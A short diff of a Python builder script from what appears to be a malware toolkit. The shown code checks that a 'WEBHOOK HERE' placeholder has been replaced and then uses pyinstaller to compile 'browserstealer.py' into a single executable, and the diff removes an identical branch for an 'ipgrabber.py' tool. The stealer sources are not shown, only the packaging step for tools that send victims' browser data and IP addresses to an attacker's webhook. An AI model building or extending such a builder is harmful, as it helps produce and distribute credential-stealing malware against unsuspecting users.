@@ -32,11 +32,3 @@ if index == 2:
             print('Must add your webhook in browserstealer.py')
         elif 'WEBHOOK HERE' not in contents:
             os.system('pyinstaller --onefile browserstealer.py')
-
-if index == 3:
-    with open('ipgrabber.py') as f:
-        contents = f.read()
-        if 'WEBHOOK HERE' in contents:
-            print('Must add your webhook in ipgrabber.py')
-        elif 'WEBHOOK HERE' not in contents:
-            os.system('pyinstaller --onefile ipgrabber.py')
